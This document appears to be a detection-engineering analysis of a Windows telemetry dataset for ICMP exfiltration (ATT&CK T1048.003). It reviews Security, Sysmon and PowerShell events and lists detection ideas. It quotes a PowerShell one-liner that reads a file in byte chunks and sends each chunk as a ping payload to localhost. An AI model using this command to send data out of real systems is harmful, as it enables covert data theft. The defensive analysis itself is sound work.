# T1048.003-2: Exfiltration Over Unencrypted Non-C2 Protocol — Exfiltration Over Unencrypted Non-C2 Protocol - ICMP Exfiltration

## Technique Context

T1048.003 represents exfiltration over ICMP, a classic technique where attackers leverage Internet Control Message Protocol packets to covertly transfer data out of compromised networks. This technique is particularly attractive to adversaries because ICMP traffic is commonly allowed through firewalls for legitimate network diagnostics (ping, traceroute), making malicious data exfiltration blend with normal network operations.

The detection community focuses heavily on unusual ICMP patterns: large packet sizes, high frequency of ICMP traffic from internal hosts, ICMP packets containing non-standard payloads, and processes that shouldn't normally generate ICMP traffic suddenly doing so. The technique is well-documented in penetration testing frameworks and has been observed in real-world intrusions where attackers needed to exfiltrate data through restrictive network controls.

## What This Dataset Contains

This dataset captures a PowerShell-based ICMP exfiltration attempt using the .NET `System.Net.NetworkInformation.Ping` class. The core technique is visible in Security EID 4688 showing the PowerShell command: `"powershell.exe" & {$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }}`.

The PowerShell telemetry in EID 4103/4104 events shows the technique components: `New-Object System.Net.Networkinformation.ping` for creating the ping object, and `Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024` for reading the target file (notepad.exe) in 1024-byte chunks. The script attempts to send each chunk via ICMP to localhost (127.0.0.1) with a 1500ms timeout.

Sysmon captures the process creation chain: parent PowerShell process (PID 8464) spawning a child PowerShell process (PID 8340) that executes the exfiltration script. Multiple EID 7 events show .NET runtime loading in the PowerShell processes, indicating script execution preparation. However, notably absent are Sysmon EID 3 network connection events showing the actual ICMP traffic.

## What This Dataset Does Not Contain

This dataset lacks the most critical evidence for detecting ICMP exfiltration: the actual network connections. No Sysmon EID 3 events show ICMP traffic from the PowerShell processes to 127.0.0.1, suggesting the technique may have been blocked or failed to execute fully. The Sysmon configuration captures network connections, so this absence likely indicates the ICMP functionality didn't successfully generate detectable network activity.

Missing are any Windows Firewall logs that might show ICMP packet details, packet capture data that would reveal the actual ICMP payload contents, or any indication that the file reading operation encountered errors. The technique targets localhost (127.0.0.1) rather than an external IP, which limits its real-world exfiltration value but may have contributed to execution issues.

## Assessment

This dataset provides moderate value for detection engineering, primarily for identifying the preparation and command-line artifacts of ICMP exfiltration attempts rather than the network-based indicators. The PowerShell logging is excellent - both command invocation (EID 4103) and script block logging (EID 4104) clearly capture the technique's implementation details. Security event logging with command-line auditing (EID 4688) provides reliable process-based detection opportunities.

The main limitation is the absence of network telemetry showing actual ICMP traffic, which significantly reduces the dataset's utility for developing network-based detections. However, this represents a realistic scenario where host-based detections may be the primary or only available detection vector, especially in environments with limited network monitoring.

## Detection Opportunities Present in This Data

1. **PowerShell ICMP Object Creation**: Detect `New-Object System.Net.NetworkInformation.Ping` in PowerShell script block logs or command invocations, especially when combined with file reading operations.

2. **File Reading with Byte Encoding**: Monitor for `Get-Content` cmdlets using `-Encoding Byte` parameter combined with `-ReadCount`, indicating potential data chunking for exfiltration.

3. **PowerShell Command Line Patterns**: Alert on command lines containing both ping object creation and file reading operations in single PowerShell execution contexts.

4. **Process Chain Analysis**: Detect PowerShell parent processes spawning child PowerShell processes with network-related .NET object instantiation patterns.

5. **Suspicious File Access Patterns**: Monitor for PowerShell processes reading system files (like notepad.exe) with byte-level access, which is unusual for legitimate administrative scripts.

6. **PowerShell Network API Usage**: Create detections for PowerShell processes loading networking-related .NET assemblies combined with file I/O operations, indicating potential exfiltration preparation.
